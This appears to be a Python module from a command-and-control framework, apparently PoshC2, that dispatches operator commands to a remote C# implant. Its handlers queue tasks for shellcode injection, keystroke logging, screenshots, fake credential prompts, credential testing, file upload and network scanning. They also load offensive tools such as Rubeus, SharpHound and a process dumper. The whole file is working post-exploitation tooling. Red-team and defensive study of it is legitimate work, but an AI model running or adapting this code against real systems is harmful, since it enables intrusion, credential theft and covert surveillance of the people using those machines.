import base64, re, traceback, os
from Alias import cs_alias, cs_replace
from Colours import Colours
from Utils import randomuri, validate_sleep_time
from DB import new_task, update_sleep, update_label, unhide_implant, kill_implant, get_implantdetails, get_pid
from AutoLoads import check_module_loaded
from Help import sharp_help1
from Config import ModulesDirectory, POSHDIR
from Core import readfile_with_completion
from Utils import argp, load_file

def run_autoloads(command, randomuri, user):
  if command.startswith("run-exe seatbelt"): check_module_loaded("Seatbelt.exe", randomuri, user)
  elif command.startswith("run-exe sharpup"): check_module_loaded("SharpUp.exe", randomuri, user)
  elif command.startswith("run-exe safetydump"): check_module_loaded("SafetyDump.exe", randomuri, user)
  elif command.startswith("run-exe rubeus"): check_module_loaded("Rubeus.exe", randomuri, user)
  elif command.startswith("run-exe sharpview"): check_module_loaded("SharpView.exe", randomuri, user)
  elif command.startswith("run-exe watson"): check_module_loaded("Watson.exe", randomuri, user)
  elif command.startswith("run-exe sharphound"): check_module_loaded("SharpHound.exe", randomuri, user)

def handle_sharp_command(command, user, randomuri, startup):
    try:
        check_module_loaded("Stage2-Core.exe", randomuri, user)
    except Exception as e:
        print ("Error loading Stage2-Core.exe: %s" % e)

    # alias mapping
    for alias in cs_alias:
        if alias[0] == command[:len(command.rstrip())]:
          command = alias[1]

     # alias replace
    for alias in cs_replace:
      if command.startswith(alias[0]):
        command = command.replace(alias[0], alias[1])   

    run_autoloads(command, randomuri, user)

    if "searchhelp" in command:
        searchterm = (command).replace("searchhelp ","")
        import string
        helpful = string.split(sharp_help1, '\n')
        for line in helpful:
          if searchterm in line.lower():
            print (line)

    elif "upload-file" in command:
        source = ""
        destination = ""
        s = ""
        if command.lower() == "upload-file":
          source = readfile_with_completion("Location of file to upload: ")
          while not os.path.isfile(source):
            print("File does not exist: %s" % source)
            source = readfile_with_completion("Location of file to upload: ")
          destination = raw_input("Location to upload to: ")
        else:
          args = argp(command)
          source = args.source
          destination = args.destination
        try:
          with open(source, "rb") as source_file:
            s = source_file.read()
          if s:
            sourceb64 = base64.b64encode(s)
            destination = destination.replace("\\","\\\\")
            print ("")
            print ("Uploading %s to %s" % (source, destination))
            uploadcommand = "upload-file%s;\"%s\"" % (sourceb64, destination)
            new_task(uploadcommand, user, randomuri)
          else:
            print("Source file could not be read or was empty")
        except Exception as e:
          print ("Error with source file: %s" % e)
          traceback.print_exc()

    elif "unhide-implant" in command:
        unhide_implant(randomuri)

    elif "hide-implant" in command:
        kill_implant(randomuri)

    elif "safetydump" in command:
        check_module_loaded("SafetyDump.exe", randomuri, user)
        new_task(command, user, randomuri)

    elif "inject-shellcode" in command:
        params = re.compile("inject-shellcode", re.IGNORECASE)
        params = params.sub("", command)
        path = readfile_with_completion("Location of shellcode file: ")
        try:
          shellcodefile = load_file(path)
          if shellcodefile != None:
            new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile),params, os.path.basename(path)), user, randomuri)
        except Exception as e:
          print ("Error loading file: %s" % e)

    elif "kill-implant" in command or "exit" in command:
        impid = get_implantdetails(randomuri)
        ri = raw_input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid[0])
        if ri.lower() == "n":
          print ("Implant not terminated")
        if ri == "":
          new_task("exit", user, randomuri)
          kill_implant(randomuri)
        if ri.lower() == "y":
          new_task("exit",user, randomuri)
          kill_implant(randomuri)
    
    elif "seatbelt " in command:
        check_module_loaded("Seatbelt.exe", randomuri, user)
        new_task(command, user, randomuri)

    elif (command.startswith("stop-keystrokes")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
        
    elif (command.startswith("get-keystrokes")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-screenshotmulti")):
        new_task(command, user, randomuri)

    elif (command.startswith("get-screenshot")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
        
    elif (command.startswith("arpscan")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
  
    elif (command.startswith("testadcredential")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
          
    elif (command.startswith("testlocalcredential")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("turtle")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
        
    elif (command.startswith("get-userinfo")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
                    
    elif (command.startswith("get-content")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
                    
    elif (command.startswith("resolvednsname")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
          
    elif (command.startswith("resolveip")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
                  
    elif (command.startswith("cred-popper")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("get-serviceperms")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)

    elif (command.startswith("move")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
        
    elif (command.startswith("delete")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
      
    elif (command.startswith("ls")):
        new_task("run-exe Core.Program Core %s" % command, user, randomuri)
                    
    elif (command == "pwd") or (command == "pwd "):
        new_task("run-exe Core.Program Core pwd", user, randomuri)
          
    elif (command == "ps") or (command == "ps "):
        new_task("run-exe Core.Program Core Get-ProcessList", user, randomuri)

    elif "loadmoduleforce" in command:
        params = re.compile("loadmoduleforce ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user, force=True)
  
    elif "loadmodule" in command:
        params = re.compile("loadmodule ", re.IGNORECASE)
        params = params.sub("", command)
        check_module_loaded(params, randomuri, user)

    elif "listmodules" in command:
        modules = os.listdir("%s/Modules/" % POSHDIR)
        print ("")
        print ("[+] Available modules:")
        print ("")
        for mod in modules:
          if (".exe" in mod) or (".dll" in mod) :
            print (mod)
        new_task(command, user, randomuri)
  
    elif "modulesloaded" in command:
        ml = get_implantdetails(randomuri)
        print (ml[14])
      
    elif command == "help" or command == "?" or command == "help ":
        print (sharp_help1)
      
    elif (command == "back") or (command == "clear") or (command == "back ") or (command == "clear "):
        startup(user)
        
    elif ('beacon' in command and '-beacon' not in command) or 'set-beacon' in command or 'setbeacon' in command:
        new_sleep = command.replace('set-beacon ', '')
        new_sleep = new_sleep.replace('setbeacon ', '')
        new_sleep = new_sleep.replace('beacon ', '').strip()
        if not validate_sleep_time(new_sleep):
          print(Colours.RED)
          print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
          print(Colours.GREEN)
        else:
          new_task(command, user,  randomuri)
          update_sleep(new_sleep, randomuri)

    elif (command.startswith('label-implant')):
        label = command.replace('label-implant ', '')
        update_label(label, randomuri)
        startup(user)
            
    else:
        if command:
          new_task(command, user, randomuri)
        return